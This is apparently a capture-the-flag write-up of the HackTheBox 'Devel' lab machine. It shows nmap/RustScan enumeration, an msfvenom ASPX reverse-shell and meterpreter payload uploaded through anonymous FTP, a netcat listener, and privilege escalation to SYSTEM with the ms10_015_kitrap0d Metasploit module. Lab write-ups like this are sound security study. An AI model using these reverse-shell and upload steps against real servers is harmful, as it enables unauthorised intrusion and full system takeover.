## Enumeration:

Starting the enumeration phase, I performed a quick RustScan and found only two open ports: 21 (FTP) and 80 (HTTP).

```bash
sudo rustscan -a 10.10.10.5 -- -sC -sV -vv -oN devel_nmap
```

```
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| ftp-syst:

80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5

|_http-title: IIS7

```

The scan results showed that anonymous FTP login was allowed, and there was a directory named "aspnet_client" present in the FTP server. Additionally, there was a Microsoft IIS web server running on port 80.

Upon checking the web server, I only found the IIS welcome image with no other significant content.

I then performed Sub-directory enumeration using tools like GoBuster and FFUF didn't yield any useful results.

## Initial Access:

Proceeding with the enumeration, I decided to explore the FTP server as an anonymous user.

```bash
FTP -vv 10.10.10.5
```

The FTP directory revealed another folder named "system_web," which contained yet another folder named "2_0_50727."

Although subsequent sub-directory enumerations didn't provide any new findings, I speculated that since the FTP files and directories might be accessible from the web server as well, attempting to access the "aspnet_client" folder would lead to a 403 Forbidden error. This confirmed the availability of FTP files and directories on the web server.

To gain initial access, I created an ASP-based reverse shell using MSFVenom, taking advantage of the "aspnet_client" folder on the FTP server. After uploading the reverse shell to the server using the PUT command.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=ip_here LPORT=1337 -e x86/shikata_ga_nai -f aspx -o adv.aspx

PUT dawn.aspx
```

I accessed the uploaded file from my web browser & successfully obtained a reverse shell running as the 'IIS web' user. ðŸ™‚

```bash
nc -lnvp 1337
```

## Metasploit:

As my current privileges were insufficient to download files using standard tools such as curl, wget & Invoke-WebRequest, I decided to further exploit the system using Metasploit. First, I created a meterpreter payload and initiated Metasploit.

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 LHOST=10.10.14.128 LPORT=1337 -f aspx -o narnia.aspx

msfconsole
```

Setting the necessary options in Metasploit and starting the listener, I executed the payload and gained a meterpreter session.

After having the access, I used a module called "post/multi/recon/local_exploit_suggester" to identify potential privilege escalation vectors.

After selecting session option '1' and running the module, several possible privilege escalation exploits were suggested:

After the task is completed I got almost 15 exploits which appears to be vulnerable:

## Privilege Escalation:

The first exploit suggested, "bypass_uac," wouldn't work as my current user wasn't in the administrator group.

I chose not to use the "cve_2020_0787" exploit since it wouldn't be ethical to exploit a vulnerability that didn't exist at the time the box was released.

However, the "ms10_015_kitrap0d" exploit seemed promising for privilege escalation. Thus, I executed it.

Running the exploit resulted in another meterpreter session running with "NT Authority \System" privileges : (pwn3d! ðŸ™‚)

With escalated privilege level, I gained access to sensitive files and directories, including both the user and root flags.
